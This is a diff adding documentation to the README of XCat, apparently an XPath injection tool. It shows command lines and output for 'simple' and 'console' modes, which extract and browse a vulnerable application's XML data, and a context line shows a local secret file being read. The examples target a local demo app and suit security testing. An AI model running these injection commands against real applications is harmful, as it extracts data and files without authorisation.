@@ -145,6 +145,44 @@ works if the vulnerable parameter supports the doc feature (and optionally entit
     >> file:///C:/Users/x/xcat/src/example_application/secret.txt
     This is a secret file. Do not read me!
 
+There are also two other commands `simple` and `console` that will help you navigate larger XML file without having to get everything. They are very 
+useful to have a quick overview of the XML document.
+
+    >> xcat --method=GET --public-ip="localhost" http://localhost:8080 title=Foundation title "1 results found" run simple
+    Injecting using FunctionCall
+    Detecting features...
+    Listening on 0
+    Listening on 42292
+    Supported features: Out of bounds HTTP, String to codepoints, Substring search speedup, Read local XML files, XPath 2, Read local text files
+    Retrieving overview
+    <?xml version="1.0" encoding="utf-8"?>
+    <library>
+	    3 text node
+	    <rentals>
+		    3 text node
+		    <books>
+			    <!--1 comment node-->
+    
+
+For the `console` commands, it will open you a shell where you can type your command and navigate the document.
+
+    Injecting using FunctionCall
+    Detecting features...
+    Listening on 0
+    Listening on 45470
+    Supported features: Substring search speedup, Read local XML files, Read local text files, Out of bounds HTTP, String to codepoints, XPath 2
+    Opening console
+    /*[1] : 
+
+The supported command of the shell are `ls`, `cd`, `attr`, `comment`, `content`, `name`.
+
+    ls - List the name of all the subnode.
+    cd - Change the current node. Use the value `..` to navigate back. to specify an absolute path start with a `/`.
+    attr - List the attributes of the current node.
+    comment - List of the comments node of the current node.
+    content - Return the content of the current node.
+    name - Return the node name of the current node. 
+
 ### Simple usage with the example application
 Check out the [readme](src/example_application) to try out XCat with the provided example application.
 
